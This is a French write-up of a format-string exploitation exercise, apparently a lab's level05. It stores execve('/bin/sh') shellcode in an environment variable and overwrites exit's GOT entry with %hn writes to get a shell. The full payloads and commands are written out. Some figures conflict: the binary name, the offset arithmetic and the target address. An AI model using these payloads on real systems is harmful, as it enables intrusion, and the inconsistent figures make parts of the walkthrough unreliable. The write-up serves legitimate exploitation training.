```shell
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

## Etape 1: Recuperer l'adresse du shellcode

On utilise GDB pour trouver l'adresse exacte de notre variable `SHELLCODE` en mémoire lors de l'exécution :

```shell
gdb ./level01
break main
# Breakpoint 1, 0x8048449 in main ()
run
print (char *)getenv("SHELLCODE")
# On obtient $1 = 0xffffd4f7
```

--> L'adresse de base est `0xffffd4f7`. 
L'environnement dans GDB étant légèrement différent de celui du bash pur, nous n'allons pas viser le tout début de l'adresse. Nous ajoutons 100 octets (`0x60`) pour viser le milieu de notre NOP sled.
`0xffffd4f7 + 0x70` = **`0xFFFFD567`**
En Little Endian, notre adresse finale est : `\x67\xd5\xff\xff`

# Etape 2: Trouver l'adresse de exit

```shell
objdump -R ./level05 | grep 'exit'
```

On obtient `080497e0 R_386_JUMP_SLOT   exit` --> L'adresse de exit est donc `\xe0\x97\x04\x08`

# Etape 3: Trouver l'offset

Nous allons faire la meme methode que d'habitude, mais cette fois avec 11112222 plutot que AAAA, afin que notre input ne soit pas modifie par le code.

```shell
./level05
11112222 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
```

--> Nous trouvons notre 1111 et 2222 en tant que 10 et 11eme value, l'offset sera donc de 10.

# Etape 4: Execution

Afin de pouvoir ecrire plus que 100 char (etant limite par le fgets) nous allons utiliser %hn. A la difference de %n, il ecrit sur un plus petit nombre d'octets, ce qui permet donc de mettre plus de characteres dans notre entree.

ex: Avec n, nous aurions fait 4294956391%10$n (correspondant a l'hexa de l'adresse du shellcode en decimal), avec hn, nous n'avons plus qu'a mettre `%54607c%10$hn%10920c%11$hn`

NB: 54607 correspond a la partie basse (0xD557) de notre shellcode, tandis que 10920 correspond a la partie haute (0xFFFF). 

```shell
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%54607c%10$hn%10920c%11$hn"'; cat) | ./level05
```

--> Nous pouvons passer au level06 !
